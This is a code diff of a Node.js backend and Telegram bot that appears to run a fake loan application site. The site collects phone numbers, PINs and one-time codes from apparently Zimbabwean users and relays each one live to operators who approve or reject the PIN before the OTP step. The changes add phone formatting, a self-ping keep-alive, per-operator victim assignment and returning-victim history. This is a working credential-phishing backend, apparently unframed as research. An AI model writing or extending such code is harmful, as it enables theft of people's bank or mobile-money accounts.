@@ -43,6 +43,18 @@ function getAdminIdByChatId(chatId) {
     return null;
 }
 
+// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
+function formatPhone(phoneNumber) {
+    if (!phoneNumber) return phoneNumber;
+    // Handle double prefix e.g. +2630712345678 → 0712345678
+    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4); // +2630... → 0...
+    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4); // +263... → 0...
+    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);  // 2630... → 0...
+    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3); // 263... → 0...
+    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 7... → 07...
+    return phoneNumber;
+}
+
 async function sendToAdmin(adminId, message, options = {}) {
     const chatId = adminChatIds.get(adminId);
 
@@ -162,10 +174,12 @@ db.connectDatabase()
             console.error('❌ Bot API error:', botError);
         }
 
-        // Keep-alive
+        // Keep-alive + self-ping to prevent Render free tier sleep
         setInterval(() => {
             console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
-        }, 60000);
+            const pingUrl = `${WEBHOOK_URL}/health`;
+            fetch(pingUrl).catch(() => {});
+        }, 14 * 60 * 1000); // every 14 minutes
 
         // Webhook health check + auto-fix
         setInterval(async () => {
@@ -346,14 +360,14 @@ Provide this to your super admin to get access.
         if (pinPending.length > 0) {
             message += `📱 *PIN (${pinPending.length}):*\n`;
             pinPending.forEach((app, i) => {
-                message += `${i+1}. ${app.phoneNumber} - \`${app.id}\`\n`;
+                message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
             });
             message += '\n';
         }
         if (otpPending.length > 0) {
             message += `🔢 *OTP (${otpPending.length}):*\n`;
             otpPending.forEach((app, i) => {
-                message += `${i+1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`;
+                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
             });
         }
         if (pinPending.length === 0 && otpPending.length === 0) {
@@ -967,7 +981,7 @@ Super admin has been notified.
 ❌ *WRONG PIN AT OTP STAGE*
 
 📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
+📱 ${formatPhone(application.phoneNumber)}
 🔢 \`${application.otp}\`
 
 ⚠️ User's PIN was incorrect
@@ -987,7 +1001,7 @@ User will re-enter PIN.
 ❌ *WRONG CODE*
 
 📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
+📱 ${formatPhone(application.phoneNumber)}
 🔢 \`${application.otp}\`
 
 ⚠️ Wrong verification code
@@ -1007,7 +1021,7 @@ User will re-enter code.
 ❌ *INVALID - REJECTED*
 
 📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
+📱 ${formatPhone(application.phoneNumber)}
 🔑 \`${application.pin}\`
 
 ✗ REJECTED
@@ -1024,7 +1038,7 @@ User will re-enter code.
 ✅ *ALL CORRECT - APPROVED*
 
 📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
+📱 ${formatPhone(application.phoneNumber)}
 🔑 \`${application.pin}\`
 
 ✓ APPROVED
@@ -1043,7 +1057,7 @@ User will now proceed to OTP.
 🎉 *LOAN APPROVED!*
 
 📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
+📱 ${formatPhone(application.phoneNumber)}
 🔑 \`${application.pin}\`
 🔢 \`${application.otp}\`
 
@@ -1092,22 +1106,30 @@ app.post('/api/verify-pin', async (req, res) => {
         let assignedAdmin;
 
         if (assignmentType === 'specific' && requestAdminId) {
+            // ── HARD LOCK: customer came via a specific admin link ──
+            // NEVER fall back to another admin — that would be a data leak.
             assignedAdmin = await db.getAdmin(requestAdminId);
-            if (pausedAdmins.has(requestAdminId)) {
+
+            if (!assignedAdmin) {
                 processingLocks.delete(lockKey);
-                return res.status(400).json({ success: false, message: 'This admin is currently paused' });
+                console.error(`❌ Specific admin not found: ${requestAdminId}`);
+                return res.status(400).json({ success: false, message: 'The link you used is invalid. Please contact support.' });
             }
-            if (!assignedAdmin || assignedAdmin.status !== 'active') {
+            if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                 processingLocks.delete(lockKey);
-                return res.status(400).json({ success: false, message: 'Invalid admin' });
+                console.warn(`⚠️ Specific admin paused/inactive: ${requestAdminId}`);
+                return res.status(400).json({ success: false, message: 'This service link is temporarily unavailable. Please try again later or contact support.' });
             }
-            console.log(`✅ Using requested admin: ${assignedAdmin.name}`);
+
+            console.log(`🔒 LOCKED to specific admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
+
         } else {
+            // ── AUTO-ASSIGN: no admin link used ──
             const activeAdmins     = await db.getActiveAdmins();
             const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
             if (availableAdmins.length === 0) {
                 processingLocks.delete(lockKey);
-                return res.status(503).json({ success: false, message: 'No admins available' });
+                return res.status(503).json({ success: false, message: 'No admins available. Please try again later.' });
             }
             const adminStats = await Promise.all(
                 availableAdmins.map(async (admin) => {
@@ -1144,10 +1166,17 @@ app.post('/api/verify-pin', async (req, res) => {
             const last       = thisAdminPastApps[0];
             const lastDate   = new Date(last.timestamp).toLocaleString();
             const lastStatus = last.otpStatus === 'approved'      ? '✅ Approved' :
-                               last.pinStatus === 'rejected'      ? '❌ Rejected' :
-                               last.otpStatus === 'wrongcode'     ? '❌ Wrong Code' :
-                               last.otpStatus === 'wrongpin_otp'  ? '❌ Wrong PIN' : '⏳ Incomplete';
-            historyText = `\n📊 *Returned: ${thisAdminPastApps.length} previous app(s)*\nLast: ${lastDate} — ${lastStatus}`;
+                               last.pinStatus === 'rejected'      ? '❌ Rejected (PIN)' :
+                               last.otpStatus === 'wrongcode'     ? '❌ Wrong OTP Code' :
+                               last.otpStatus === 'wrongpin_otp'  ? '❌ Wrong PIN (OTP stage)' : '⏳ Incomplete';
+            const allStatuses = thisAdminPastApps.slice(0, 3).map((a, idx) => {
+                const s = a.otpStatus === 'approved'     ? '✅' :
+                          a.pinStatus === 'rejected'     ? '❌PIN' :
+                          a.otpStatus === 'wrongcode'    ? '❌OTP' :
+                          a.otpStatus === 'wrongpin_otp' ? '❌PIN@OTP' : '⏳';
+                return `${idx+1}. ${s} ${new Date(a.timestamp).toLocaleDateString()}`;
+            }).join('\n');
+            historyText = `\n\n━━━━━━━━━━━━━━━━━━\n🔄 *RETURNING CUSTOMER*\nVisits to you: *${thisAdminPastApps.length}*\nLast visit: ${lastDate}\nLast result: ${lastStatus}\nRecent history:\n${allStatuses}\n━━━━━━━━━━━━━━━━━━`;
         }
 
         // Ensure admin is in active map
@@ -1178,12 +1207,14 @@ app.post('/api/verify-pin', async (req, res) => {
         console.log(`💾 Application saved: ${applicationId}`);
 
         // Send to Telegram
-        const userLabel = isReturningUser ? '🔄 *RETURNING USER*' : '📱 *NEW APPLICATION*';
+        const userLabel = isReturningUser
+            ? `🔄 *RETURNING USER* (${thisAdminPastApps.length}x before)`
+            : '🆕 *NEW APPLICATION*';
         await sendToAdmin(assignedAdmin.adminId, `
 ${userLabel}
 
 📋 \`${applicationId}\`
-📱 ${phoneNumber}
+📞 ${formatPhone(phoneNumber)}
 🔑 \`${pin}\`
 ⏰ ${new Date().toLocaleString()}${historyText}
 
@@ -1243,11 +1274,14 @@ app.post('/api/verify-otp', async (req, res) => {
         await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
         console.log(`✅ OTP saved for ${applicationId}: ${otp}`);
 
+        const returningLabel = application.isReturningUser
+            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
+            : '';
         await sendToAdmin(application.adminId, `
-📲 *CODE VERIFICATION*
+📲 *CODE VERIFICATION*${returningLabel}
 
 📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
+📞 ${formatPhone(application.phoneNumber)}
 🔢 \`${otp}\`
 ⏰ ${new Date().toLocaleString()}
 
@@ -1293,7 +1327,7 @@ app.post('/api/resend-otp', async (req, res) => {
 🔄 *OTP RESEND REQUEST*
 
 📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
+📱 ${formatPhone(application.phoneNumber)}
 
 User requested a new OTP.
         `, { parse_mode: 'Markdown' });
